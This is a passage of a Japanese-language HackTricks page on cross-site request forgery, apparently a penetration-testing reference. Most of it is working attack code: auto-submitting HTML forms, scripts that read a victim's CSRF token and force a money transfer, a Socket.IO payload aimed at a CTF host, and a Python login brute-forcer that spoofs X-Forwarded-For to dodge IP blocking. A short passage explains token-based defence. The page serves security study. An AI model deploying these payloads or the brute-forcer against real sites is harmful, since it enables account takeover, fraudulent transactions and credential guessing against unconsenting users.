<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajaxを使用してCSRFトークンを盗み、フォームでPOSTリクエストを送信する**

```html
<script>
    // CSRFトークンを取得するためのAjaxリクエスト
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/get-csrf-token', true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var csrfToken = xhr.responseText;

            // 盗んだCSRFトークンを使用してPOSTリクエストを送信するフォームを作成
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '/transfer-money';

            // 盗んだCSRFトークンをフォームに追加
            var csrfInput = document.createElement('input');
            csrfInput.type = 'hidden';
            csrfInput.name = 'csrf_token';
            csrfInput.value = csrfToken;
            form.appendChild(csrfInput);

            // 送信するデータをフォームに追加
            var amountInput = document.createElement('input');
            amountInput.type = 'hidden';
            amountInput.name = 'amount';
            amountInput.value = '1000000';
            form.appendChild(amountInput);

            // フォームをbodyに追加して自動的に送信
            document.body.appendChild(form);
            form.submit();
        }
    };
    xhr.send();
</script>
```

この攻撃では、Ajaxを使用してサーバーからCSRFトークンを盗み、そのトークンを使用してフォームを作成し、POSTリクエストを送信します。攻撃者は、ユーザーが悪意のあるサイトにアクセスした場合にこの攻撃を実行することができます。

攻撃者は、Ajaxリクエストを使用してサーバーからCSRFトークンを取得します。取得したトークンは、フォームの隠しフィールドに追加されます。その後、フォームは自動的に送信され、攻撃者が指定したアクション（この場合は`/transfer-money`）にPOSTリクエストが送信されます。

この攻撃により、攻撃者はユーザーの名前で悪意のあるアクションを実行することができます。ユーザーは攻撃が行われていることに気付かずに、自分の意図しないアクションが実行される可能性があります。
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IOを使用したCSRF

Socket.IOは、Webアプリケーションでリアルタイムな双方向通信を実現するためのJavaScriptライブラリです。Socket.IOを使用してリアルタイムな通信を行うWebアプリケーションは、CSRF（Cross-Site Request Forgery）攻撃の潜在的な脆弱性にさらされる可能性があります。

CSRF攻撃は、攻撃者が被害者の代わりに意図しないリクエストを送信することで、被害者のアカウントやデータを乗っ取る攻撃手法です。Socket.IOを使用する場合、CSRFトークンを適切に実装することで、この攻撃を防ぐことができます。

Socket.IOでは、CSRFトークンを生成し、クライアントとサーバーの間でやり取りする必要があります。以下の手順でCSRFトークンを実装します。

1. サーバー側で、セッションごとに一意のCSRFトークンを生成します。
2. サーバーは、Socket.IOの接続時に生成されたCSRFトークンをクライアントに送信します。
3. クライアントは、受け取ったCSRFトークンを保持し、リクエストを送信する際にトークンを含めます。
4. サーバーは、受け取ったリクエストのCSRFトークンを検証し、正当なリクエストかどうかを判断します。

このようにCSRFトークンを実装することで、Socket.IOを使用したWebアプリケーションのセキュリティを向上させることができます。攻撃者が意図しないリクエストを送信しても、正当なCSRFトークンがないため、サーバーはリクエストを拒否します。

Socket.IOを使用する際には、必ずCSRFトークンの実装を行い、セキュリティを確保しましょう。
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFログインブルートフォース

このコードは、CSRFトークンを使用してログインフォームをブルートフォース攻撃するために使用することができます（また、可能なIPブラックリスト回避のためにX-Forwarded-Forヘッダーも使用しています）。
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## ツール <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## 参考文献

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **ウェブ3のバグについてもっと学ぶために**

🐞 ウェブ3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFTコレクション**](https://opensea.io/collection/the-peass-family)
* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するためにPRを提出して** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に参加してください。**

</details>
